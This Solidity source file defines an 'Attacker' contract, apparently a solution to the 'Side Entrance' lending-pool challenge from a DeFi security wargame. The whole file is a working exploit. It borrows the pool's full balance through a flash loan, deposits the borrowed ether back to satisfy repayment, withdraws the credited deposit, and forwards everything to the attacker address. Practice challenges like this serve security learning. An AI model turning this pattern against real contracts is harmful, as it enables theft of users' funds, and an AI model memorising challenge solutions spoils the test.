pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface SideEntrance {
    function deposit() external payable;

    function flashLoan(uint256 amount) external;

    function withdraw() external;
}

contract Attacker {
    address payable attacker;

    function callFlashLoan(address _contract, address _attacker) public {
        uint256 amount = _contract.balance;
        attacker = payable(_attacker);
        SideEntrance(_contract).flashLoan(amount);
        SideEntrance(_contract).withdraw();
    }

    function execute() public payable {
        SideEntrance(msg.sender).deposit{value: msg.value}();
    }

    receive() external payable {
        // console.log("attacker before", attacker.balance);
        // console.log("balance:", address(this).balance);
        attacker.transfer(address(this).balance);
        // console.log("attacker after", attacker.balance);
    }
}
